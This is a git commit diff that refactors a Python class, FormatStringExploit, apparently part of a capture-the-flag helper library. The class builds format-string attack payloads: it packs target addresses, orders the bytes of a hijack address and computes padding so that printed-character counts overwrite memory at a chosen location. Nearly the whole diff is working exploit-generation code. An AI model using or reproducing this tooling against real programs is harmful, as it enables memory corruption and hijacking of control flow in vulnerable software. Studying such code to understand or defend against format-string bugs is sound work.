08782aa0f1ce0610a0e1b62411645b7434313d7a
Naetw <wangzhelee.cs04@g2.nctu.edu.tw>
2017-02-09 18:14:20 +0800

    Make FormatStringExploit more functional to be more flexible

--- formatstring/fmtexp.py
+++ formatstring/fmtexp.py
@@ -1,4 +1,5 @@
 import struct
+import math
 
 p32 = lambda x : struct.pack('<L', x)
 p64 = lambda x : struct.pack('<Q', x)
@@ -17,14 +18,25 @@ class FormatStringExploit:
                 }
 
     def generate32(self):
-
-        # Arrange size of addres per byte for optimization
-        adr = [(i, self.hijack_address >> 8 * i) for i in xrange(4)]
-        adr = sorted(map(get_byte, adr), key=lambda x : (x[1] - 16) & 0xff)
-
-        # Start generate payload
+        adr = self.address_setup()
         payload = self.generate_target(adr, 32)
         adr = map(lambda x : x[1], adr)
+        payload += self.generate_fmt(adr)
+        return payload
+
+    def address_setup(self, size=4):
+        '''Arrange size of addres per byte for optimization'''
+        adr = [(i, self.hijack_address >> 8 * i) for i in xrange(size)]
+        adr = sorted(map(get_byte, adr), key=lambda x : (x[1] - 16) & 0xff)
+        return adr
+        
+    def generate_target(self, adr, bits):
+        payload = ''.join(self.table[bits][0](self.hijack_target + i[0]) for i in adr)
+        FormatStringExploit.printed += self.table[bits][1] * (bits / 8)
+        return payload
+
+    def generate_fmt(self, adr):
+        payload = ''
         for idx, byte in enumerate(adr):
             pad = ((byte - FormatStringExploit.printed) % 256 + 256) % 256
             if pad > 0:
@@ -33,11 +45,7 @@ class FormatStringExploit:
             FormatStringExploit.printed += pad
         return payload
 
-    def generate_target(self, adr, bits):
-        payload = ''.join(self.table[bits][0](self.hijack_target + i[0]) for i in adr)
-        FormatStringExploit.printed += self.table[bits][1] * (bits / 8)
-        return payload
 
     def size(self):
-        # Return already printed words
+        '''Return already printed words'''
         return FormatStringExploit.printed
